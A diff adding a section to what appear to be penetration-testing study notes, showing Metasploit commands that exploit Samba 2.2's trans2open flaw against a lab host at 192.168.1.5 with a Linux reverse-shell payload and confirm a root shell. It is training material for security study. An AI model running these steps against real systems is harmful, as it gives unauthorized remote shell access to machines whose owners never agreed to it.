@@ -709,3 +709,29 @@ run
     * Sends exploit code in stages
     * Can be less stable
     * Example: windows/meterpreter/reverse_tcp
+
+### Gaining Root with Metasploit
+```bash
+searchsploit samba 2.2
+# Kept seeing trans2open show up
+msfconsole
+search trans2open
+use 1
+options
+set rhosts 192.168.1.5
+options
+show targets
+# run or exploit
+exploit
+#Ctrl+C if died multiple times
+options
+# Now we will see payload options, hit linux and tab in set and double tab
+set payload linux
+# check out non-staged payload
+set payload linux/x86/shell_reverse_tcp
+options
+run
+# Now we see Command shell session 5 opened 
+whoami
+hostname
+```
